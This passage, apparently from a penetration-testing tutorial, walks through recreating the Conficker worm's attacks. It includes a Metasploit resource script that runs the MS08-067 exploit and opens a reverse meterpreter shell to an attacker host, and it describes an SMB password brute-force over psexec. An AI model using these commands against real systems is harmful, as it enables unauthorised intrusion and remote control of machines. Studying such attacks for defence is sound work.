The open source computer security \n","## project, Metasploit, has risen to quick popularity to become the de facto \n","## exploitation toolkit over the last eight years. Championed and developed by the leg- \n","## endary exploit writer, HD Moore, Metasploit allows penetration testers to launch \n","## thousands of different computer exploits from a standardized and scriptable envi- \n","## ronment. Shortly after the release of the vulnerability included in the Conficker \n","## worm, HD Moore integrated a working exploit into the framework—ms08- \n","## 067_ne-tapi.\n","\n","## To utilize Metasploit’s attack, we first chose our exploit (exploit/windows/smb/ \n","## ms08_067_ne-tapi) and then set the target to 192.168.1.37. Following target selec- \n","## tion, we indicated the payload as windows/meterpreter/reverse_tcp and selected a \n","## reverse connection to our host at 192.168.77.77 on port 7777. Finally, we told \n","## Metasploit to exploit the system. Saving the configuration file to the filename con- \n","## ficker.rc, we can now launch our attack by issuing the command msfconsole –r \n","## conficker.rc. This command will tell Metasploit to launch with the conficker.rc con- \n","## figuration file. When successful, our attack returns a Windows command shell to \n","## control the machine.\n","\n","## use exploit/windows/smb/ms08_067_netapi \n","## set RHOST 192.168.1.37 \n","## set PAYLOAD windows/meterpreter/reverse_tcp \n","## set LHOST 192.168.77.77 \n","## set LPORT 7777 \n","## exploit –j –z\n","\n","\n","## First, lets use the Nmap-Python module from our previous portscanner example.\n","\n","## Here, the function findTgts,() takes an input of potential target hosts and returns \n","## all the hosts that have TCP port 445 open. TCP port 445 serves as a primary port \n","## for the SMB protocol. By filtering only the hosts that have a TCP port 445 open, our \n","## attack script can now target only valid ones. This will eliminate hosts that would \n","## ordinarily block our connection attempt. The function iterates through all hosts in \n","## the scan. If the function finds a host with a TCP open, it appends that host to an \n","## array. After completing the iteration, the function returns this array, containing all \n","## the hosts with TCP port 445 open.\n","\n","\n","## While attackers have successfully launched the ms08_067_netapi exploit against \n","## victims around the world, a defender can easily prevent it with current security \n","## patches. Thus, the script will require the second attack vector used in the Conficker \n","## Worm. It will need to brute force through SMB username/password combinations \n","## attempting to gain access to remotely executed processes on the host (psexec). \n","## The function smbBrute takes the Metasploit configuration file, the target host, a \n","## second file containing a list of passwords, and the local address and port for the\n","## listener. It sets the username as the default windows Administrator and then opens \n","## the password file. For each password in the file, the function builds a Metasploit \n","## resource configuration in order to use the remote process execution (psexec) ex- \n","## ploit. If a username/password combination succeeds, the exploit launches the \n","## Meterpreter payload back to the local address and port.\n","\n","## Tying this back all together, the script now has the ability to scan for possible tar- \n","## gets and exploit them using the MS08_067 vulnerability and/or brute force \n","## through a list of passwords to remotely execute processes. Finally, we will add \n","## some option parsing back to the main() function of the script and then call the pre- \n","## vious written functions as required to wrap up the entire script.
